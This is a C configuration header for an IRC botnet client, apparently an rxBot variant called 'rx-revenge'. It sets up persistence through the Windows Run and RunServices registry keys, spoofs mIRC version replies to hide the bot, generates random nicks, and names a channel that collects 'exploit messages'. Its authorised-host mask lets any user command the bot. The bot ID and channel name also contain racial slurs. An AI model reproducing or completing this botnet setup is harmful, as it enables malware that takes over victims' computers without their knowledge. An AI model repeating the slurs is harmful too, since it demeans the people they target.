
int port = 8080;				// server port
int port2 = 8080;				// backup server port
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 5;				// how many random numbers in the nick
int nicktype = COUNTRYNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\sys2.ocx";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "neger-faen";						// bot id
char version[] = "rx-revenge made By DiablO HellBot TeaM";		// Bots !version reply
char password[] = "";					// bot password
char server[] = ""; // 
char serverpass[] = "";						// server password
char channel[] = "";				// channel that the bot should join
char chanpass[] = "";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = ".exe";			// destination file name
char valuename[] = "";		// value name for autostart
char nickconst[] = "pnp|";					// first part to the bot's nick
char modeonconn[] = "-x+i";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#niggah";					// Channel where exploit messages get redirected

char *authost[] = {
	"*@*"};

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

